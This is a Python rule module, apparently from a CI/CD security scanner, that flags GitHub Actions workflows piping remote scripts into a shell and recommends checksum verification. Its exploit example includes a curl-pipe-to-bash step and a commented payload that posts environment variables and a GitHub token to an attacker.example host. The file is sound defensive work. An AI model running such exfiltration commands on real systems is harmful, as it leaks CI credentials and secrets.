"""GHA-016, remote script piped to shell interpreter."""
from __future__ import annotations

from typing import Any

from ..._primitives import remote_script_exec
from ...base import Finding, Severity, blob_lower
from ...rule import Rule

RULE = Rule(
    id="GHA-016",
    title="Remote script piped to shell interpreter",
    severity=Severity.HIGH,
    owasp=("CICD-SEC-3",),
    esf=("ESF-S-VERIFY-DEPS",),
    cwe=("CWE-494",),
    recommendation=(
        "Download the script to a file, verify its checksum, then "
        "execute it. Or vendor the script into the repository."
    ),
    docs_note=(
        "Detects `curl | bash`, `wget | sh`, and similar patterns "
        "that pipe remote content directly into a shell interpreter "
        "inside a workflow. An attacker who controls the remote "
        "endpoint (or poisons DNS / CDN) gains arbitrary code "
        "execution in the CI runner."
    ),
    known_fp=(
        "Established vendor installers (get.docker.com, sh.rustup.rs, "
        "bun.sh/install, awscli.amazonaws.com, cli.github.com, ...) "
        "ship via HTTPS from their own CDN and are idiomatic. This "
        "rule defaults to LOW confidence so CI gates can ignore them "
        "with --min-confidence MEDIUM; the finding still surfaces so "
        "teams that want cryptographic verification can audit.",
    ),
    incident_refs=(
        "[Codecov Bash uploader compromise](https://about.codecov.io/security-update/) "
        "(April 2021): an attacker modified the codecov.io/bash "
        "uploader script (commonly fetched via ``curl -s "
        "codecov.io/bash | bash``) to exfiltrate environment "
        "variables from CI runners (AWS keys, GitHub tokens, "
        "signing keys) at thousands of customers for over two "
        "months before discovery.",
        "[event-stream](https://github.com/dominictarr/event-stream/issues/116) "
        "(November 2018) and the [ua-parser-js compromise](https://github.com/faisalman/ua-parser-js/issues/536) "
        "(October 2021): npm-side examples of the same primitive. "
        "When the CI runner executes bytes a third party can swap out "
        "(via `curl | bash`, an unpinned `npm install`, or a "
        "compromised maintainer account), the attacker controls "
        "what runs with the runner's credentials in scope. Pinning a "
        "digest or vendoring a frozen copy turns a perpetual ambient "
        "risk into a one-time review.",
    ),
    exploit_example=(
        "# Vulnerable: install script piped straight to bash.\n"
        "steps:\n"
        "  - run: curl -sL https://example.com/install.sh | bash\n"
        "\n"
        "# Attack: an attacker who controls the install.sh endpoint\n"
        "# (compromised CDN, expired domain, BGP hijack, account\n"
        "# takeover, or simply being the upstream maintainer with bad\n"
        "# intent) drops a payload that runs in the CI runner with\n"
        "# every secret available to the job:\n"
        "#\n"
        "#   #!/usr/bin/env bash\n"
        "#   # legitimate-looking install actions...\n"
        "#   curl -X POST https://attacker.example/exfil \\\n"
        "#     -d \"$(env)\" -d \"$(cat $GITHUB_TOKEN_FILE 2>/dev/null)\"\n"
        "#\n"
        "# The runner has no way to know the bytes changed.\n"
        "\n"
        "# Safe: download, verify a known-good digest, then execute.\n"
        "steps:\n"
        "  - run: |\n"
        "      curl -sLo install.sh https://example.com/install.sh\n"
        "      echo \"abc123...expected_sha256  install.sh\" | sha256sum -c\n"
        "      bash install.sh"
    ),
)


def check(path: str, doc: dict[str, Any]) -> Finding:
    hits = remote_script_exec.scan(blob_lower(doc))
    passed = not hits
    desc = (
        "No curl-pipe or wget-pipe patterns detected in this workflow."
        if passed else
        f"Remote script piped to interpreter detected: "
        f"{', '.join(h.snippet for h in hits[:3])}"
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=path, description=desc,
        recommendation=RULE.recommendation, passed=passed,
    )
